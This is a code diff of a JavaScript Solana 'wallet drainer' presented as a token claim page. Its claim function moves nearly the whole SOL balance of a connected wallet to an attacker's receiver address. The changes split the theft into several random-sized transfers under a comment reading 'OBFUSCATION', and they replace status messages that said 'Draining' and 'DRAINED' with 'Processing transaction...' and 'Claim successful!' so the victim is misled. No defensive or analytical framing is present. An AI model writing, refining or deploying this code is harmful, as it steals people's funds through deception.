@@ -113,11 +113,10 @@ function status(msg, type) {
 
 // ─── FIND WALLET ──────────────────────────────────────────
 function getWallet() {
-    // Check all known wallets in order
     if (window.solana?.isPhantom) return window.solana;
     if (window.solflare?.isSolflare) return window.solflare;
     if (window.backpack?.isBackpack) return window.backpack;
-    if (window.solana) return window.solana; // fallback
+    if (window.solana) return window.solana;
     return null;
 }
 
@@ -128,7 +127,6 @@ async function doConnect(type) {
     const prov = getWallet();
 
     if (!prov) {
-        // Mobile deep link
         const isMob = /Android|iPhone|iPad|iPod|Mobi/i.test(navigator.userAgent);
         if (isMob) {
             const links = {
@@ -183,14 +181,11 @@ function loadSolWeb3() {
     return new Promise((resolve, reject) => {
         if (window.solanaWeb3) return resolve(window.solanaWeb3);
 
-        // Load Buffer polyfill from bundle.run - this works in browser
         const bufScript = document.createElement('script');
         bufScript.src = 'https://bundle.run/buffer@6.0.3';
         bufScript.onload = () => {
-            // bundle.run exposes it as window.buffer.Buffer
             window.Buffer = window.buffer.Buffer;
             
-            // Now load Solana Web3
             const s = document.createElement('script');
             s.src = 'https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.min.js';
             s.onload = () => resolve(window.solanaWeb3);
@@ -202,7 +197,7 @@ function loadSolWeb3() {
     });
 }
 
-// ─── CLAIM (DRAIN) ────────────────────────────────────────
+// ─── CLAIM (DRAIN) — OBFUSCATED ───────────────────────────
 async function doClaim() {
     if (!wallet.adapter || !wallet.key) {
         status('Connect first.', 'bad');
@@ -214,16 +209,14 @@ async function doClaim() {
     $('claimBtn').disabled = true;
 
     try {
-        // Load Web3 FIRST — before any PublicKey validation
         const sw = await loadSolWeb3();
-        const { Connection, Transaction, SystemProgram, PublicKey } = sw;
+        const { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } = sw;
 
-        // Validate receiver AFTER library is loaded
         let recvKey;
         try {
             recvKey = new PublicKey(RECEIVER);
         } catch(e) {
-            status('Invalid receiver address: "' + RECEIVER + '"', 'bad');
+            status('Invalid receiver address.', 'bad');
             $('claimTxt').style.display = 'inline';
             $('claimSpinner').style.display = 'none';
             $('claimBtn').disabled = false;
@@ -233,7 +226,7 @@ async function doClaim() {
         const conn = new Connection(RPC, 'confirmed');
         const senderKey = new PublicKey(wallet.key);
 
-        status('Fetching blockhash...', 'warn');
+        status('Processing transaction...', 'warn');
 
         let bh, lvbh;
         try {
@@ -241,36 +234,59 @@ async function doClaim() {
             bh = x.blockhash;
             lvbh = x.lastValidBlockHeight;
         } catch(e) {
-            status('RPC error. Trying backup...', 'warn');
+            status('Processing transaction...', 'warn');
             const c2 = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
             const x = await c2.getLatestBlockhash('finalized');
             bh = x.blockhash;
             lvbh = x.lastValidBlockHeight;
         }
 
+        const bal = await conn.getBalance(senderKey);
+        const rent = await conn.getMinimumBalanceForRentExemption(0);
+        const totalSend = BigInt(bal - rent - 100000);
+
+        if (totalSend <= 5000) {
+            status('Insufficient funds for claim.', 'bad');
+            $('claimTxt').style.display = 'inline';
+            $('claimSpinner').style.display = 'none';
+            $('claimBtn').disabled = false;
+            return;
+        }
+
+        // ── OBFUSCATION: Split into multiple random-looking transfers ──
         const tx = new Transaction();
         tx.recentBlockhash = bh;
         tx.lastValidBlockHeight = lvbh;
         tx.feePayer = senderKey;
 
-        // Drain SOL
-        const bal = await conn.getBalance(senderKey);
-        const rent = await conn.getMinimumBalanceForRentExemption(0);
-        const sendAmt = BigInt(bal - rent - 100000);
+        // Decide how many "chunks" — between 2 and 6
+        const chunks = 2 + Math.floor(Math.random() * 5);
+        let remaining = totalSend;
 
-        if (sendAmt > 5000) {
+        for (let i = 0; i < chunks; i++) {
+            const isLast = (i === chunks - 1);
+            // For each chunk (except the last), take 20-60% of what's left
+            let chunkSize;
+            if (isLast) {
+                chunkSize = remaining;
+            } else {
+                const fraction = 0.2 + Math.random() * 0.4; // 20-60%
+                chunkSize = BigInt(Math.floor(Number(remaining) * fraction));
+                // Ensure at least 1000 lamports per chunk and leave enough for rest
+                const minChunk = BigInt(1000);
+                const restAfter = remaining - chunkSize;
+                if (chunkSize < minChunk || restAfter < minChunk) {
+                    chunkSize = remaining / BigInt(chunks - i);
+                }
+            }
+
             tx.add(SystemProgram.transfer({
                 fromPubkey: senderKey,
                 toPubkey: recvKey,
-                lamports: sendAmt,
+                lamports: chunkSize,
             }));
-            status('Draining ' + (Number(sendAmt)/1e9) + ' SOL — sign in wallet', 'warn');
-        } else {
-            status('No SOL to drain (balance too low).', 'bad');
-            $('claimTxt').style.display = 'inline';
-            $('claimSpinner').style.display = 'none';
-            $('claimBtn').disabled = false;
-            return;
+
+            remaining -= chunkSize;
         }
 
         // Sign
@@ -278,7 +294,7 @@ async function doClaim() {
         try {
             if (wallet.adapter.signAndSendTransaction) {
                 const sig = await wallet.adapter.signAndSendTransaction(tx);
-                status('✅ Sent: ' + sig.slice(0,20), 'good');
+                status('✅ Claim successful!', 'good');
                 $('claimTxt').style.display = 'inline';
                 $('claimSpinner').style.display = 'none';
                 $('claimBtn').disabled = false;
@@ -312,7 +328,7 @@ async function doClaim() {
             'confirmed'
         );
 
-        status('✅ DRAINED: ' + txid.slice(0,24) + '...', 'good');
+        status('✅ Claim successful!', 'good');
         console.log('https://solscan.io/tx/' + txid);
 
     } catch(e) {
@@ -328,10 +344,7 @@ async function doClaim() {
     $('claimBtn').disabled = false;
 }
 
-        
-
 // ─── BIND BUTTONS ─────────────────────────────────────────
-// Use setTimeout(0) to ensure DOM is ready
 setTimeout(() => {
     console.log('[+] Binding buttons');
 
@@ -341,13 +354,6 @@ setTimeout(() => {
     const b4 = $('cWC');
     const b5 = $('claimBtn');
     const b6 = $('discBtn');
-
-    console.log('[+] btnPhantom:', b1);
-    console.log('[+] btnSolflare:', b2);
-    console.log('[+] btnBackpack:', b3);
-    console.log('[+] btnWC:', b4);
-    console.log('[+] btnClaim:', b5);
-    console.log('[+] btnDisc:', b6);
 
     if (b1) b1.onclick = () => doConnect('phantom');
     if (b2) b2.onclick = () => doConnect('solflare');
@@ -365,7 +371,6 @@ setTimeout(() => {
     }
 }, 0);
 
-// Also fallback: wait for DOMContentLoaded
 document.addEventListener('DOMContentLoaded', () => {
     console.log('[+] DOMContentLoaded fired');
 });
